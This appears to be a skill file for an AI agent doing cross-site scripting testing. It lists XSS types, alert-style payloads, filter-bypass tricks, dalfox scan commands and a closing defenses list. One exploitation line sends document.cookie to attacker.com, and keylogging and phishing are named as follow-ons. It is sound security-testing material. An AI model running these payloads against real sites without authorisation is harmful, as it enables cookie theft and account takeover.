---
name: xss-testing
description: Professional skills for cross-site scripting (XSS) testing
version: 1.0.0
---

# XSS Testing

## Overview

Cross-site scripting (XSS) lets an attacker execute malicious JavaScript in a victim's browser. This skill covers reflected, stored, and DOM-based XSS testing methods.

## XSS types

### 1. Reflected XSS
- Malicious script delivered via URL parameters
- Server returns the script directly in the response
- Requires the user to click a malicious link

### 2. Stored XSS
- Malicious script stored on the server (database, files, etc.)
- Every user who visits the affected page executes it
- Broader impact

### 3. DOM-based XSS
- Client-side JavaScript mishandles user input
- No server-side processing involved
- Triggered by modifying the DOM

## Testing methodology

### Basic payloads
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### Filter bypass

#### Case bypass
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
```

#### Encoding bypass
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

#### Event handlers
```javascript
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<div onmouseover=alert('XSS')>hover</div>
<input onfocus=alert('XSS') autofocus>
```

#### Pseudo-protocols
```javascript
<a href="javascript:alert('XSS')">click</a>
<iframe src="javascript:alert('XSS')">
```

### Advanced bypass techniques

#### String.fromCharCode
```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### eval + atob
```javascript
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

#### HTML entities
```javascript
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

## Tool usage

### dalfox
```bash
# Basic scan
dalfox url "http://target.com/page?q=test"

# Specify parameter
dalfox url "http://target.com/page" -d "q=test" -X POST

# Custom payloads
dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
```

### Burp Suite
- Intruder for bulk testing
- Repeater for manual testing
- Scanner for automatic detection

### Browser console
- Test DOM-based XSS
- Inspect the JavaScript execution context
- Debug payloads

## Verification and exploitation

### Verification steps
1. Confirm the payload executes
2. Check whether it was filtered or encoded
3. Test different contexts (HTML, JavaScript, attributes, etc.)
4. Assess impact (cookie theft, session hijacking, etc.)

### Exploitation scenarios
- Cookie theft: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
- Keylogging: inject a keyboard event listener
- Phishing: fake login form
- Session hijacking: capture the user's session token

## Reporting essentials

- XSS type (reflected / stored / DOM)
- Trigger location and parameter
- Complete PoC
- Impact assessment
- Remediation advice (output encoding, CSP, etc.)
- Once confirmed, record the finding via the `report_finding` tool (the platform's sole entry point for recording vulnerabilities)

## Defenses

- Input validation and filtering
- Output encoding (HTML, JavaScript, URL)
- Content Security Policy (CSP)
- HttpOnly cookie flag
- Secure frameworks and libraries
